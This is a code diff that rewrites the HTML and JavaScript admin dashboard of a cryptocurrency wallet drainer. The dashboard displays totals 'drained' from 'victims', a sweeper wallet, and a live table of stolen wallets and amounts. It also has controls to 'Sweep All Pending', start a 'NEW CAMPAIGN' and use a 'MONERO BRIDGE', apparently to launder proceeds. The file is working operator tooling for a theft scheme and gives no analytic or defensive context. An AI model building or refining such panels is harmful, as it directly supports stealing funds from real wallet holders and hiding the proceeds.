@@ -1,103 +1,149 @@
 <!DOCTYPE html>
-<html lang="en" class="h-full bg-gray-950">
+<html lang="en" class="h-full">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS CONTROL PANEL</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <style>
-        .glitch { animation: glitch 1s linear infinite; }
-        @keyframes glitch {
-            0%,100% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-        }
-        .status-online { box-shadow: 0 0 20px #00ff41; animation: pulse-slow 3s infinite; }
-        .terminal-border { border: 1px solid #00ff41; }
-        .matrix-bg { background: linear-gradient(rgba(0,0,0,0.95), rgba(0,0,0,0.95)), repeating-linear-gradient(0deg, transparent, transparent 2px, #003b00 2px, #003b00 4px); }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Drainer Admin • 2025</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body { font-family: 'Inter', sans-serif; }
+    .sidebar { background: linear-gradient(180deg, #0f0f0f 0%, #1a1a1a 100%); }
+    .active-link { background: rgba(34, 197, 94, 0.15); border-left: 4px solid #22c55e; }
+    .card { background: #111111; border: 1px solid #222222; }
+  </style>
 </head>
-<body class="h-full font-mono matrix-bg text-terminal-green overflow-hidden">
-    <div class="container mx-auto p-6 h-full flex flex-col">
-        <div class="flex justify-between items-center mb-8 border-b border-terminal-green pb-4">
-            <div>
-                <h1 class="text-5xl font-bold glitch">NEXUS CONTROL PANEL</h1>
-                <p class="text-matrix-green">v3.2.1 // FULLY OPERATIONAL</p>
-            </div>
-            <div class="text-right">
-                <div class="flex items-center gap-2 mb-2">
-                    <div class="w-4 h-4 bg-terminal-green rounded-full status-online"></div>
-                    <span>SECURE LINK ACTIVE</span>
-                </div>
-                <div id="timestamp" class="text-sm"></div>
-            </div>
-        </div>
+<body class="h-full bg-gray-900 text-gray-100">
 
-        <div class="grid grid-cols-4 gap-6 mb-8 flex-grow">
-            <div class="col-span-2 grid grid-cols-2 gap-4">
-                <div class="bg-black/60 p-6 rounded terminal-border"><p class="text-sm mb-2">TOTAL LIQUIDITY EXTRACTED</p><p class="text-4xl font-bold" id="totalUsd">$0.00</p></div>
-                <div class="bg-black/60 p-6 rounded terminal-border"><p class="text-sm mb-2">SUCCESSFUL EXECUTIONS</p><p class="text-4xl font-bold" id="victimCount">0</p></div>
-                <div class="bg-black/60 p-6 rounded terminal-border"><p class="text-sm mb-2">AVG PER WALLET</p><p class="text-3xl font-bold text-yellow-400" id="avg">$0.00</p></div>
-                <div class="bg-black/60 p-6 rounded terminal-border"><p class="text-sm mb-2">ACTIVE SWEEPER</p><p class="text-xs break-all font-mono" id="sweeperWallet">loading...</p></div>
-            </div>
+<div class="flex h-screen">
 
-            <div class="col-span-2 bg-black/60 p-6 rounded terminal-border">
-                <p class="text-matrix-green mb-4">24H EXTRACTION FLOW</p>
-                <canvas id="activityChart" height="220"></canvas>
-            </div>
-
-            <div class="col-span-4 bg-black/60 rounded terminal-border p-6 overflow-hidden">
-                <p class="text-xl mb-4">LIVE EXECUTION STREAM</p>
-                <div class="h-80 overflow-y-auto font-mono text-sm">
-                    <table class="w-full"><tbody id="executionStream"></tbody></table>
-                </div>
-            </div>
-        </div>
-
-        <div class="flex gap-4 pt-4 border-t border-terminal-green">
-            <button class="flex-1 bg-red-600/30 hover:bg-red-600/50 text-red-400 px-8 py-4 rounded text-xl font-bold border border-red-500/50">EXECUTE SWEEP</button>
-            <button class="flex-1 bg-purple-600/30 hover:bg-purple-600/50 text-purple-400 px-8 py-4 rounded text-xl font-bold border border-purple-500/50">MONERO BRIDGE</button>
-            <button class="flex-1 bg-cyan-600/30 hover:bg-cyan-600/50 text-cyan-400 px-8 py-4 rounded text-xl font-bold border border-cyan-500/50">NEW CAMPAIGN</button>
-        </div>
+  <!-- Sidebar -->
+  <div class="w-64 sidebar text-white flex flex-col">
+    <div class="p-6 border-b border-gray-800">
+      <h1 class="text-2xl font-bold text-green-500">DRAINER</h1>
+      <p class="text-xs text-gray-400 mt-1">Control Panel v5</p>
     </div>
+    <nav class="flex-1 p-4">
+      <a href="#" class="flex items-center space-x-3 p-4 rounded-lg active-link mb-2">
+        <i class="fas fa-tachometer-alt"></i>
+        <span class="font-medium">Dashboard</span>
+      </a>
+      <a href="#" class="flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800 mb-2">
+        <i class="fas fa-users"></i>
+        <span>Victims</span>
+      </a>
+      <a href="#" class="flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800 mb-2">
+        <i class="fas fa-wallet"></i>
+        <span>Sweeper</span>
+      </a>
+      <a href="#" class="flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800">
+        <i class="fas fa-cog"></i>
+        <span>Settings</span>
+      </a>
+    </nav>
+    <div class="p-4 border-t border-gray-800">
+      <div class="text-xs text-gray-400">Status: <span class="text-green-500 font-bold">ONLINE</span></div>
+    </div>
+  </div>
 
-    <script>
-        const ctx = document.getElementById('activityChart').getContext('2d');
-        const chart = new Chart(ctx, { type: 'line', data: { labels: [], datasets: [{ label: 'USD', borderColor: '#00ff41', backgroundColor: 'rgba(0,255,65,0.1)', tension: 0.4, fill: true, data: [] }] }, options: { responsive: true, plugins: { legend: { display: false } }, scales: { y: { grid: { color: '#003b00' }, ticks: { color: '#008f11' } }, x: { grid: { color: '#003b00' }, ticks: { color: '#008f11' } } } } });
+  <!-- Main Content -->
+  <div class="flex-1 overflow-y-auto">
+    <div class="p-8">
 
-        function updateDashboard() {
-            fetch('/data').then(r => r.json()).then(d => {
-                document.getElementById('totalUsd').textContent = '$' + Number(d.total).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-                document.getElementById('victimCount').textContent = d.victims.length.toLocaleString();
-                document.getElementById('avg').textContent = d.victims.length ? '$' + Math.round(d.total / d.victims.length).toLocaleString() : '$0';
-                document.getElementById('sweeperWallet').textContent = d.wallet;
-                document.getElementById('timestamp').textContent = new Date().toISOString().replace('T', ' ').substring(0,19) + ' UTC';
+      <!-- Top Stats -->
+      <div class="grid grid-cols-4 gap-6 mb-8">
+        <div class="card rounded-xl p-6">
+          <div class="flex items-center justify-between">
+            <div>
+              <p class="text-gray-400 text-sm">Total Drained</p>
+              <p class="text-3xl font-bold text-green-500" id="total">$0</p>
+            </div>
+            <i class="fas fa-dollar-sign text-4xl text-green-500 opacity-20"></i>
+          </div>
+        </div>
+        <div class="card rounded-xl p-6">
+          <div class="flex items-center justify-between">
+            <div>
+              <p class="text-gray-400 text-sm">Victims Today</p>
+              <p class="text-3xl font-bold text-blue-400" id="count">0</p>
+            </div>
+            <i class="fas fa-skull-crossbones text-4xl text-blue-400 opacity-20"></i>
+          </div>
+        </div>
+        <div class="card rounded-xl p-6">
+          <div>
+            <p class="text-gray-400 text-sm">Avg per Victim</p>
+            <p class="text-2xl font-bold text-yellow-400" id="avg">$0</p>
+          </div>
+        </div>
+        <div class="card rounded-xl p-6">
+          <div>
+            <p class="text-gray-400 text-sm">Sweeper Wallet</p>
+            <p class="text-xs font-mono break-all text-gray-300" id="wallet">loading...</p>
+          </div>
+        </div>
+      </div>
 
-                // Update live stream
-                const tbody = document.getElementById('executionStream');
-                tbody.innerHTML = d.victims.slice(-20).reverse().map(v => `
-                    <tr class="border-b border-matrix-green/30 hover:bg-white/5">
-                        <td class="py-2">${v.time}</td>
-                        <td class="py-2">${v.wallet}</td>
-                        <td class="py-2"><span class="px-2 py-1 bg-terminal-green/20 rounded">${v.chain}</span></td>
-                        <td class="py-2">${v.assets}</td>
-                        <td class="py-2 text-terminal-green font-bold">${v.drained}</td>
-                        <td class="py-2"><span class="text-xs bg-terminal-green/20 px-2 py-1 rounded">COMPLETE</span></td>
-                    </tr>`).join('');
+      <!-- Live Table -->
+      <div class="card rounded-xl p-6">
+        <div class="flex justify-between items-center mb-6">
+          <h2 class="text-2xl font-bold">Live Drains</h2>
+          <button onclick="sweepAll()" class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
+            <i class="fas fa-bolt"></i> Sweep All Pending
+          </button>
+        </div>
+        <div class="overflow-x-auto">
+          <table class="w-full text-sm">
+            <thead class="border-b border-gray-700">
+              <tr>
+                <th class="text-left py-3">Time</th>
+                <th class="text-left py-3">Wallet</th>
+                <th class="text-left py-3">Chain</th>
+                <th class="text-left py-3">Amount</th>
+                <th class="text-left py-3">Status</th>
+              </tr>
+            </thead>
+            <tbody id="victims" class="divide-y divide-gray-800"></tbody>
+          </table>
+        </div>
+      </div>
 
-                // Update chart
-                if (d.hourly) {
-                    chart.data.labels = d.hourly.map(h => h.hour);
-                    chart.data.datasets[0].data = d.hourly.map(h => h.value);
-                    chart.update('quiet');
-                }
-            });
-        }
-        setInterval(updateDashboard, 4000);
-        updateDashboard();
-    </script>
+    </div>
+  </div>
+</div>
+
+<script>
+  function update() {
+    fetch('/data')
+      .then(r => r.json())
+      .then(d => {
+        document.getElementById('total').textContent = '$' + Number(d.total).toLocaleString()
+        document.getElementById('count').textContent = d.victims.length
+        document.getElementById('avg').textContent = d.victims.length ? '$' + Math.round(d.total / d.victims.length).toLocaleString() : '$0'
+        document.getElementById('wallet').textContent = d.wallet
+
+        const tbody = document.getElementById('victims')
+        tbody.innerHTML = d.victims.slice().reverse().map(v => `
+          <tr class="hover:bg-gray-800 transition">
+            <td class="py-4 text-gray-400">${v.time}</td>
+            <td class="py-4 font-mono text-cyan-400">${v.wallet}</td>
+            <td class="py-4"><span class="px-3 py-1 bg-gray-800 rounded-full text-xs">${v.chain}</span></td>
+            <td class="py-4 text-green-400 font-bold">${v.drained}</td>
+            <td class="py-4"><span class="text-green-500 text-xs">✓ DRAINED</span></td>
+          </tr>
+        `).join('')
+      })
+  }
+
+  function sweepAll() {
+    fetch('/sweep', {method: 'POST'}).then(() => {
+      alert('Sweep command sent to all chains.')
+    })
+  }
+
+  setInterval(update, 3000)
+  update()
+</script>
 </body>
 </html>
